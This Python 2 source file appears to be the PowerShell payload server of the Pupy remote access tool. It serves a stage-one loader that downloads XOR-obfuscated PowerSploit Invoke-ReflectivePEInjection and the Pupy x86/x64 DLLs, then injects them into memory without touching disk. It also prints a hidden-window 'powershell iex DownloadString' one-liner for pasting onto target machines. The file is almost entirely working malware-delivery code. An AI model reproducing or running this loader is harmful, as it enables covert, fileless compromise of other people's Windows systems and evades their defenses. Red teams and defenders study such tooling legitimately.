#!/usr/bin/env python
# -*- coding: UTF8 -*-
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import os.path
from pupylib.utils.term import colorize
import textwrap
from pupygen import get_edit_pupyx86_dll, get_edit_pupyx64_dll 
try:
    import ConfigParser as configparser
except ImportError:
    import configparser
from ssl import wrap_socket

ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))

import random,base64
def ps1_encode(s):
    return base64.b64encode(s)
def ps1_decode():
    return 

def xor_bytes(b, key=0x42):
    return ''.join([chr(ord(x)^key) for x in b])

class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path=="/p":
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.end_headers()
            pe_bootloader=(textwrap.dedent("""
            $rpi=[System.Convert]::FromBase64String((New-Object System.Net.WebClient).DownloadString("http://%s:%s/rpi"))
            for($i=0; $i -lt $rpi.count ; $i++)
            {
                $rpi[$i] = $rpi[$i] -bxor %s
            }
            iex([System.Text.Encoding]::UTF8.GetString($rpi))
            $path="b64"
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8){$path="b32"}
            [Byte[]]$b=(New-Object System.Net.WebClient).DownloadData("http://%s:%s/"+$path)
            for($i=0; $i -lt $b.count ; $i++)
            {
                $b[$i] = $b[$i] -bxor %s
            }
            Invoke-ReflectivePEInjection -ForceASLR -PEBytes $b -Verbose
            """%(self.server.link_ip, self.server.link_port, hex(self.server.xor_key), self.server.link_ip, self.server.link_port, hex(self.server.xor_key))))
            self.wfile.write(pe_bootloader)
            print colorize("[+] ","green")+" powershell script stage1 served !"

        elif self.path=="/rpi":
            #serve the powershell script
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.end_headers()
            code=open(os.path.join(ROOT, "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1")).read()
            self.wfile.write(base64.b64encode(xor_bytes(code, self.server.xor_key)))
            print colorize("[+] ","green")+" powershell Invoke-ReflectivePEInjection.ps1 script served !"
        elif self.path=="/b32":
            #serve the pupy 32bits dll to load from memory
            self.send_response(200)
            self.send_header('Content-type','application/octet-stream')
            self.end_headers()
            print colorize("[+] ","green")+" generating x86 reflective dll ..."
            self.wfile.write(xor_bytes(get_edit_pupyx86_dll(self.server.payload_conf)), self.server.xor_key)
            print colorize("[+] ","green")+" pupy x86 reflective dll served !"
        elif self.path=="/b64":
            #serve the pupy 64bits dll to load from memory
            self.send_response(200)
            self.send_header('Content-type','application/octet-stream')
            self.end_headers()
            print colorize("[+] ","green")+" generating amd64 reflective dll ..."
            self.wfile.write(xor_bytes(get_edit_pupyx64_dll(self.server.payload_conf), self.server.xor_key))
            print colorize("[+] ","green")+" pupy amd64 reflective dll served !"
        else:
            self.send_response(404)
            self.end_headers()
            return

class ps1_HTTPServer(HTTPServer):
    def __init__(self, server_address, conf, link_ip, link_port, ssl):
        self.payload_conf = conf
        self.link_ip=link_ip
        self.link_port=link_port
        self.xor_key=random.randint(1,254)
        HTTPServer.__init__(self, server_address, PupyPayloadHTTPHandler)
        if ssl:
            config = configparser.ConfigParser()
            config.read("pupy.conf")
            keyfile=config.get("pupyd","keyfile").replace("\\",os.sep).replace("/",os.sep)
            certfile=config.get("pupyd","certfile").replace("\\",os.sep).replace("/",os.sep)
            self.socket = wrap_socket (self.socket, certfile=certfile, keyfile=keyfile, server_side=True)

def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", ssl=False):
    try:
        while True:
            try:
                server = ps1_HTTPServer((ip, port), conf, link_ip, port, ssl)
                break
            except Exception as e:
                # [Errno 98] Adress already in use
                if e[0] == 98:
                    port+=1
                else:
                    raise
        print colorize("[+] ","green")+"copy/paste this one-line loader to deploy pupy without writing on the disk :"
        print " --- "
        oneliner=colorize("powershell.exe -w hidden -noni -nop -c \"iex(New-Object System.Net.WebClient).DownloadString('http://%s:%s/p')\""%(link_ip, port), "green")
        print oneliner
        print " --- "

        print colorize("[+] ","green")+'Started http server on %s:%s '%(ip, port)
        print colorize("[+] ","green")+'waiting for a connection ...'
        server.serve_forever()
    except KeyboardInterrupt:
        print 'KeyboardInterrupt received, shutting down the web server'
        server.socket.close()
        exit()


